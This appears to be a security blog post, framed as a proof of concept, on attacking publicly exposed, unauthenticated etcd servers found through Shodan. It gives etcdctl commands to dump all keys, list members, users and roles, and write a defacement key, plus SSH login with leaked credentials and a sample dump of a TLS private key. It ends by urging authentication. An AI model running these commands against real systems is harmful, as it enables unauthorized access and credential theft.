# PoC: Hacking Systems via Exposed ETCD Instances

[*Etcd*](https://github.com/etcd-io/etcd) is an open-source distributed key-value store that provides a reliable way to store data across a cluster of machines.  
It's often used as a foundational component in distributed systems, serving as a distributed coordination service for managing configurations, maintaining state, and facilitating communication between different parts of a distributed system.  

Originally developed by CoreOS, etcd is written in Go and uses the **Raft consensus algorithm** to ensure consistency and fault-tolerance.  
It's designed to be highly available, durable, and scalable, making it suitable for use in production environments where reliability and consistency are crucial.  

Some common use cases for etcd include service discovery, leader election, configuration management, and coordination between distributed components.  
It's widely used in container orchestration systems like **Kubernetes**, where it helps manage cluster state and configuration data for containers and their applications.  

It is not uncommon to encounter instances of etcd publicly exposed and lacking authentication measures.  
In such cases, malevolent actors may exploit the API using tools like curl or, preferably, [*etcdctl*](https://github.com/etcd-io/etcd/blob/main/etcdctl/README.md), to perform malicious operations. Here is an example of a real-world scenario.  

## The Scenario
A malicious actor is probing exposed services on [*Shodan*](https://www.shodan.io/) with the following simple query: `etcd`.  
After several attempts, they discover an instance of etcd without authentication and attempt to list the *keys/values* using the following command:  
```bash
export ETCDCTL_ENDPOINTS="http://$EXPOSED_IP:2379" \
&& export ETCDCTL_API=3 \
&& etcdctl get --prefix ""
```  

Possible Output:  

```bash
/apis/url/
https://my.api.com/v1/users/  

apis/token/
wBtkA97eCyqPfQWtGBXf35T5AYbAuKGrQ1Ifq6wgzwjhZXtr87yQDgokSjfiVCVI  

/ssh/user/
system  

/ssh/pass/
Pp4Ss_W.0rd_
```  

> Note  
> the attacker can also list all the etcd peers with this command: `etcdctl member list`  


It's worth noting that, at this juncture, an attacker could potentially inflict damage on the system by deleting and/or modifying the values of the etcd keys.  
In this specific scenario, if the target server also exposes SSH, the attacker might also attempt to gain access using the values of the keys */ssh/user/* and */ssh/pass/*:  

```bash
ssh system@$EXPOSED_IP 
system password:  Pp4Ss_W.0rd_
```   

The attacker can also add a new key value:  
```bash
etcdctl put rooted P4wn3D!🖕
```  

or retrieve etcd users and roles:  
```bash
etcdctl user list; etcdctl role list
```  

There have also been instances where [*PostgreSQL*](https://www.postgresql.org/) configurations were stored in one key in etcd, and its credentials in another.  
In that particular scenario, PostgreSQL was also exposed as a service on the server, allowing us to query a list of tables and all the data contained within them.  
Furthermore, we discovered wildcard certificates for the entire domain of a company, intentionally redacted and obscured as follows:  

```bash
/apisix/ssl/982578101
{"id":"423764178751193820","create_time":1662112733,"update_time":1689821613,"cert":"-----BEGIN CERTIFICATE-----\nMIIGLDCCBRSgAwIBAgIQCJY\n-----END CERTIFICATE-----\n-----BEGIN CERTIFICATE-----\nMITqCwtukZ7u9VLL3JAq3Wdy2moKLvvC8tVmRzkAe\n0xQCkRKIjbBG80MSyDX/R4uYgj6ZiNT/Zg6GI6RofgqgpDdssLc0XIRQEotxIZcK\nzP3pGJ9FCbMHmMLLyuBd+uCWvVcF2ogYAawufChS/PT61D9rqzPRS5I2uqa3tmIT\n44JhJgWhBnFMb7AGQkvNq9KNS9dd3GWc17H/dXa1enoxzWjE0hBdFjxPhUb0W3wi\n8o34/m8Fxw==\n-----END CERTIFICATE-----\n","key":"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAzF/2R4nLsR8JCsX3Pl1kAML/zy0fmBFRXhPWmE7SGYoiWciq\niIalocl4DM7b5KEk5XwsFdMIEovyy0fgTOhquBwI+t35v7BN5b/BV/zNXHlmqqSs\nCITYs+C/7Ez6C0rsC7pyAmOUaAat4FsaSzvm/Z84s2qwtdejcwnv\n-----END RSA PRIVATE KEY-----\n",
"snis":["*.company.com","company.com"],"status":1,"validity_start":1689638400,"validity_end":1723593599}
```  

These are likely SSL/TLS certificates for [*Apache APISIX*](https://github.com/apache/apisix).  
APISIX is an open-source, cloud-native microservices API gateway that it is used for managing and securing (sigh 😔) APIs.  

Here is a list of attacks that a threat actor can probably implement with access to such certificates:  
- **Man-in-the-Middle (MitM) Attacks**
- **Data Interception**
- **Traffic Redirection**
- **Session Hijacking**
- **SSL Stripping**
- **Impersonation Attacks**
- **Replay Attacks**

Keep in mind that it is rare to encounter exposed instances of etcd containing keys with this type of sensitive data, but it has occurred in the past following some reconnaissance efforts.  


This scenario serves as a [*yet another reminder*](../04-04-24/kubernetes.md) to consistently implement robust authentication mechanisms for our systems and to refrain from exposing them to the entire world unless absolutely necessary (which, in 99.99% of cases, it is not).  


<br>  


- [Back to main page](../../../index.md)  